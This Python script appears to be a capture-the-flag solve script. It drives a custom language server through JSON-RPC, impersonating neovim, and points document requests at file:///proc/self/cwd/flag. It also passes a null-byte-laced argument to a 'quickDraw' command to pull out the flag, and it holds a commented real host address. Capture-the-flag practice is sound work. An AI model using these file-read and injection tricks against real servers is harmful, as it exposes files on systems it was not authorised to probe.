import json
import socket

class JsonRpcClient:
    def __init__(self, host='localhost', port=9999):
        self.host = host
        self.port = port
        self.socket = None
        self.request_id = 0

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        return self

    def send_request(self, method, params=None, response_expected=True):
        self.request_id += 1
        request = {
            "jsonrpc": "2.0",
            "id": self.request_id,
            "method": method,
        }
        if params is not None:
            request["params"] = params

        serialized = json.dumps(request)
        content_length = len(serialized)
        headers = f"Content-Length: {content_length}\r\n\r\n"
        
        self.socket.sendall(headers.encode() + serialized.encode())
        if not response_expected:
            return
        return self.read_response()

    def read_response(self):
        # Read headers
        headers = b""
        while b"\r\n\r\n" not in headers:
            headers += self.socket.recv(1)
        
        # Parse Content-Length
        header_text = headers.decode('ascii')
        content_length = int(header_text.split('Content-Length: ')[1].split('\r\n')[0])
        
        # Read message body
        content = b""
        while len(content) < content_length:
            chunk = self.socket.recv(content_length - len(content))
            if not chunk:
                break
            content += chunk
        
        return json.loads(content.decode('utf-8'))

    def initialize(self, root_uri=None, capabilities=None):
        params = {
            "processId": None,
            "clientInfo": {
                "name": "neovim", # pretend to be neovim
                "version": "1.0.0"
            },
            "capabilities": capabilities or {}
        }
        if root_uri:
            params["rootUri"] = root_uri

        return self.send_request("initialize", params)

    def close(self):
        if self.socket:
            self.socket.close()
            self.socket = None


bad_file = '''
package main

import "fmt"

func sux_hello() {
	temp := 1
	return temp
	// test
}
'''

good_file = '''
package main

import "fmt"

func sus_hello() {
	temp := 1
	return temp
	// test
}
'''
if __name__ == "__main__":
    # 54.221.151.72
    # 7006
    client = JsonRpcClient().connect()
    # client = JsonRpcClient(host='54.221.151.72', port=7006).connect()
    try:
        response = client.initialize()
        print("Initialization response:", response)

        response = client.send_request("workspace/executeCommand", {
            "Command": "wildwest.loadNewConfig",
            "Arguments": [{
                "EnforcePrefix": True,
                "RequiredPrefix": "sus_",
                "MinimumNameLength": 5,
                "UseFileSystem": True,
                # "xaxsas": "asohizxv"
            }]
        })
        print("ExecuteCommand response:", response)
        
        # src_file = open('test.go', 'r').read()
        response = client.send_request("textDocument/didOpen", {
            "TextDocument": {
                "uri": "file:///proc/self/cwd/flag",
                # "languageId": "go",
                # "version": 1,
                "Text": bad_file
            }
        }, response_expected=False)

        # update to good file
        response = client.send_request("textDocument/didChange", {
            "TextDocument": {
                "uri": "file:///proc/self/cwd/flag",
                # "version": 2

            },
            "ContentChanges": [{
                "text": good_file
            }]
        }, response_expected=True)

        # rename variable
        response = client.send_request("textDocument/rename", {
            "TextDocument": {
                "uri": "file:///proc/self/cwd/flag",
                # "version": 2
            },
            "Position": {
                "Line": 0,
                "Character": 0
            },
            "NewName": "test_name"
        })
        print("Rename response:", response)

        # save file
        response = client.send_request("textDocument/didSave", {
            "textDocument": {
                "URI": "file:///proc/self/cwd/flag",
                "Text": "linga guli guli",
                "languageId": "go",
                "version": 2,
            }
        }, response_expected=False)

        completion = client.send_request("textDocument/completion", {
            "TextDocument": {
                "URI": "file:///proc/self/cwd/flag",
                "languageId": "go",
                "version": 2,
            },
            "Position": {
                "Line": 0,
                "Character": 0
            },
            "Context": {
                "TriggerKind": 1,
                "TriggerCharacter": "w"
            }
        })
        # print("Completion response:", completion)

        # diagnostics
        response = client.send_request("textDocument/publishDiagnostics", {
            "URI": "file:///proc/self/cwd/flag",
            "Diagnostics": [{
                "Range": {
                    "Start": {
                        "Line": 0,
                        "Character": 0
                    },
                    "End": {
                        "Line": 0,
                        "Character": 0
                    }
                },
                "Severity": 1,
                "Source": "test",
                "Message": "test"
            }]
        }, response_expected=False)

        diagnostics = client.read_response()
        diagnostics = client.read_response()
        diagnostics = client.read_response()
        print("Diagnostics response:", diagnostics)

        for i in range(1):
            response = client.send_request("workspace/executeCommand", {
                "Command": "wildwest.quickDraw",
                # Filename, LineNumber, ?
                "Arguments": ["file:///proc/self/cwd/flag", 0, "he\x00llo there"]
            })
            # if 'pctf' in response["params"]["message"]:
            #     print("Flag found:", response["params"]["message"])
            #     break
            print("ExecuteCommand response:", response)
            # client.read_response()

        # shutdown
        response = client.send_request("shutdown", None)
        print("Shutdown response:", response)
    finally:
        client.close()